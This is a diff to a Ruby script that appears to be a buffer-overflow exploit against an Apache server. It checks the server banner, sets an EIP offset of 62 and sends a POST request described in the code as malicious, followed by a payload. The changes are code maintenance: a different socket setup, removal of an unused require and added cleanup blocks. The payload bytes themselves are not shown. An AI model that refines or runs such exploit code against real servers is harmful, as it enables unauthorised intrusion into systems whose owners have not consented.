@@ -1,9 +1,9 @@
 require 'socket'
 require 'ipaddr'
-require 'os'
+
 # Constants
 APACHE_BANNER = "Apache/"
-EIP_OFFSET = 62   
+EIP_OFFSET = 62
 
 def custom_recv_until(s, delimiter)
   data = ""
@@ -29,7 +29,7 @@ def send_payload(s, ip, port)
     target_port = port.to_i
 
     # Set up the connection
-    s.connect(Socket.pack_sockaddr_in(target_port, target_host))
+    s = TCPSocket.new(target_host, target_port)
 
     # Send the malicious HTTP request
     s.puts("POST / HTTP/1.1\r\n")
@@ -47,6 +47,8 @@ def send_payload(s, ip, port)
     s.write(payload)
   rescue Exception => e
     puts "Error occurred while sending payload: #{e}"
+  ensure
+    s&.close
   end
 end
 
@@ -82,11 +84,10 @@ def main
         print response.force_encoding('UTF-8')
       end
     end
-
-    # Close the socket
-    s.close
   rescue Exception => e
     puts "Error occurred: #{e}"
+  ensure
+    s&.close
   end
 end
 
